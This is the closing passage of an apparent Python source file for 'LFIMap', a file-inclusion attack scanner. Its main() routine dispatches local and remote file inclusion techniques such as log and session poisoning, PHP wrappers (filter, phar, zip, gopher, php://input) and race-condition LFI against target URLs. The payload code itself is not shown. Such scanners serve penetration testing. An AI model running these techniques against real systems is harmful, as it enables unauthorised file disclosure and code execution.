        if current_args.param:
            if current_args.method_type == 'GET':
                base_url_part = current_args.url.split('?')[0]
                current_args.url = f"{base_url_part}?{current_args.param}=FUZZ"
            elif current_args.method_type == 'POST':
                current_args.post_data = f"{current_args.param}=FUZZ"
            current_args.fuzz_param = False # Disable fuzz_param if a specific param is given
        
        lfi_tool = LFITool(current_args.url, current_args)

        if current_args.fuzz_param and not current_args.param: # Ensure --param isn't overriding
            lfi_tool.run_parameter_fuzzing()

        if current_args.method == "all":
            if "basic" not in current_args.exclude_technique:
                lfi_tool.run_basic_lfi()
            if "php-filter" not in current_args.exclude_technique:
                lfi_tool.run_php_filter()
            if "log-poisoning" not in current_args.exclude_technique:
                lfi_tool.run_log_poisoning()
            if "session-poisoning" not in current_args.exclude_technique:
                lfi_tool.run_session_poisoning()
            if "proc-self-environ" not in current_args.exclude_technique:
                lfi_tool.run_proc_self_environ()
            if "data-uri" not in current_args.exclude_technique:
                lfi_tool.run_data_uri()
            if "timing-based" not in current_args.exclude_technique:
                lfi_tool.run_timing_lfi()
            if "exec-wrapper" not in current_args.exclude_technique:
                lfi_tool.run_exec_wrapper()
            if "file-wrapper" not in current_args.exclude_technique:
                lfi_tool.run_file_wrapper()
            if "wrapper-phar" not in current_args.exclude_technique:
                lfi_tool.run_wrapper_phar()
            if "wrapper-zip" not in current_args.exclude_technique:
                lfi_tool.run_wrapper_zip()
            if "wrapper-glob" not in current_args.exclude_technique:
                lfi_tool.run_wrapper_glob()
            if "proc-symlink" not in current_args.exclude_technique:
                lfi_tool.run_proc_symlink()
            if "rfi" not in current_args.exclude_technique:
                lfi_tool.run_rfi()
            if "wrapper-phpinput" not in current_args.exclude_technique:
                lfi_tool.run_wrapper_phpinput()
            if "wrapper-ftp" not in current_args.exclude_technique:
                lfi_tool.run_wrapper_ftp()
            if "wrapper-gopher" not in current_args.exclude_technique:
                lfi_tool.run_wrapper_gopher()
            if "race-condition-lfi" not in current_args.exclude_technique:
                lfi_tool.run_race_condition_lfi()
        else:
            if current_args.method not in current_args.exclude_technique:
                if current_args.method == "basic":
                    lfi_tool.run_basic_lfi()
                elif current_args.method == "php-filter":
                    lfi_tool.run_php_filter()
                elif current_args.method == "log-poisoning":
                    lfi_tool.run_log_poisoning()
                elif current_args.method == "session-poisoning":
                    lfi_tool.run_session_poisoning()
                elif current_args.method == "proc-self-environ":
                    lfi_tool.run_proc_self_environ()
                elif current_args.method == "data-uri":
                    lfi_tool.run_data_uri()
                elif current_args.method == "timing-based":
                    lfi_tool.run_timing_lfi()
                elif current_args.method == "exec-wrapper":
                    lfi_tool.run_exec_wrapper()
                elif current_args.method == "file-wrapper":
                    lfi_tool.run_file_wrapper()
                elif current_args.method == "wrapper-phar":
                    lfi_tool.run_wrapper_phar()
                elif current_args.method == "wrapper-zip":
                    lfi_tool.run_wrapper_zip()
                elif current_args.method == "wrapper-glob":
                    lfi_tool.run_wrapper_glob()
                elif current_args.method == "proc-symlink":
                    lfi_tool.run_proc_symlink()
                elif current_args.method == "rfi":
                    lfi_tool.run_rfi()
                elif current_args.method == "wrapper-phpinput":
                    lfi_tool.run_wrapper_phpinput()
                elif current_args.method == "wrapper-ftp":
                    lfi_tool.run_wrapper_ftp()
                elif current_args.method == "wrapper-gopher":
                    lfi_tool.run_wrapper_gopher()
                elif current_args.method == "race-condition-lfi":
                    lfi_tool.run_race_condition_lfi()
            else:
                print_warning(f"The selected method '{current_args.method}' is in the excluded list. No scan will be performed for {target_url_base}.")

    print_info(f"\n[bold]LFIMap scan finished for all targets.[/]")

if __name__ == "__main__":
    main()
